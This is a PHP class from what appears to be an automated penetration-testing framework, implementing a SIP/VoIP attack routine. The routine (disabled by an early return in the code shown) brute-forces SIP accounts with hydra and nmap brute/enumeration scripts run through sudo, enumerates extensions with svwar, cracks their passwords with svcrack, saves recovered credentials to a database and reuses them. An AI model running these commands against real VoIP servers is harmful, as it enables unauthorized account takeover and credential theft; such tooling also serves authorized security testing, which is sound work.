<?php


class service2sip extends SERVICE {

    /*
     https://www.exploit-db.com/exploits/35801      Asterisk 1.8.4.1 - SIP 'REGISTER' Request User Enumeration 
     https://github.com/OlivierLaflamme/Cheatsheet-God/blob/master/Cheatsheet_VOIP.txt
     */

    public function __construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf) {
        parent::__construct($eth,$domain,$ip,$port,$service_protocol,$service_name,$service_version,$service_product,$service_extrainfo,$service_hostname,$service_conf);
    }


    
    public function service2sip4exec(){
        $result = "";

            return "";
            $result .= $this->ssTitre(__FUNCTION__);
            
            $users_test = array("root","admin","administrator","guest","user","test","voip");
            foreach ($users_test as $user_test){
                $result .= $this->port2auth4dico4hydra("sip",$user_test);
            }
            
            
            $result .= $this->ssTitre("Fingerprinting SIP");
            $query = "echo '$this->root_passwd' | sudo -S nmap -n  -Pn --reason --script \"sip-brute,sip-enum-users,sip-methods\" --script-args 'sip-enum-users.padding=4, sip-enum-users.minext=100,sip-enum-users.maxext=9999' $this->ip -s$this->protocol -p $this->port -e $this->eth -oX - ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->auth2login4nmap($this->req_ret_str($query),__FUNCTION__);
            
            $query = "svmap $this->ip 2>/dev/null ";
            $result .= $this->cmd("localhost",$query);
            $result .= $this->req_ret_str($query);
            
            $result .= $this->ssTitre("locate valid SIP extensions");
            $query = "svwar -m INVITE $this->ip -p $this->port -e 1-4000 2>/dev/null";
            $result .= $this->cmd("localhost",$query);
            $find_users = $this->req_ret_str($query);
            
            if (!empty($find_users)){
                $users = $this->req_ret_tab("echo '$find_users' | grep reqauth | grep -Po  \"[0-9]{1,}\"  ");
                $result .= $find_users;
                $result .= $this->ssTitre("CRACK the associated user's passwords");
                
                if (!empty($users))
                    foreach ($users as $user2name)
                    {
                        $user2name = trim($user2name);
                        $query = "svcrack -u $user2name -d $this->dico_password.1000 $this->ip -p $this->port -v 2>/dev/null | grep $user2name | sed 's/| $user2name//g' | sed 's/|//g' | tr -d \"[:space:]\" ";
                        $result .= $this->cmd("localhost",$query);
                        $pass_sip = $this->req_ret_str($query);
                        $result .= $pass_sip;
                        if (!empty($pass_sip)) {
                            $result .= $this->yesAUTH($this->ip, $this->port,$this->protocol,$user2name, $pass_sip, '','','','','',".__FUNCTION__.",$this->ip2geoip());
                            $result .= $this->cmd("localhost", "X-Lite <user id>:$user2name <secret>:$pass_sip <domain>:$this->ip");
                            //wget https://download.jitsi.org/jitsi/debian/jitsi_2.5-latest_amd64.deb
                            //dpkg -i jitsi_2.5-latest_amd64.deb
                        }
                    }
            }
            
            
            $sql_r = "select user2name,user2pass FROM AUTH where ip='$this->ip' ORDER BY user2name;";
            $conn = $this->mysql_ressource->query($sql_r);
            while ($row = $conn->fetch_assoc()){
                $user2name = trim($row['user2name']);
                $user2pass = trim($row['user2pass']);
                $result .= $this->article("USER/PASS FOUND FOR TEST", "$user2name/$user2pass");
                if (!empty($user2name)) $result .= $this->port2auth4pass4hydra("sipt", $user2name, $user2pass);
            }
            
            
            return $result;
        
        
    }
    



  }
?>
